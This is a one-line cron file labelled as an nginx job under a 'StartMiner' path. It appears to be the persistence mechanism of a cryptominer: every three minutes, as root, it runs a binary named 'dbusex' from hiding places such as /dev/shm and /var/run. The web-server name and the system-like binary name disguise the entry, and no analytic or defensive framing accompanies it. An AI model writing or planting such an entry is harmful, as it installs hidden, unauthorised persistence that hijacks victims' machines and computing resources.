# StartMiner/2010/etc/cron.d/nginx
*/3 * * * * root /dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c 
##
